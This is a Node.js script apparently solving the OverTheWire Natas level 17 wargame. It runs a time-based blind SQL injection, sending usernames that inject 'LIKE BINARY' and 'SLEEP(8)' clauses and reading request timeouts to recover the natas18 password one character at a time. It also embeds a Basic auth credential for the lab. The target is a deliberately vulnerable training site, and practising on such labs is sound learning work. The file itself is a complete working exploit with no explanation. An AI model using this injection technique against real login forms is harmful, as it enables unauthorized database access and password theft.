const request = require("request")

const url = "http://natas17.natas.labs.overthewire.org/index.php"

async function serveRequest(query) {
  const formData = {
    username: query,
  }

  return new Promise((res, rej) => {
    request.post(
      {
        url: url,
        formData: formData,
        headers: {
          Authorization:
            "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==",
        },
        timeout: 5000,
      },
      function optionalCallback(err, httpResponse, body) {
        if (err) {
          if (err.code === "ESOCKETTIMEDOUT") {
            res(1)
          }
          res(-1)
        }
        res(0)
      }
    )
  })
}

const digits = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

function doesUserExist(res) {
  return res === 1
}

;(async function () {
  let crackedPass = ""
  for (var i = 0; i < 32; i++) {
    let found = false

    console.log("starting checking the digits : ")
    for (var d in digits) {
      const query = `natas18" AND password LIKE BINARY "${crackedPass}${digits[d]}%" AND SLEEP(8)#`

      console.log("testing digit " + digits[d])
      const r = await serveRequest(query)
      const userExist = doesUserExist(r)

      if (userExist === true) {
        crackedPass = crackedPass + digits[d]
        found = true
        break
      }
    }

    if (!found) {
      console.log("ERR", "couldnt find")
      return
    } else {
      console.log("crackedPass = " + crackedPass)
    }
  }
})()
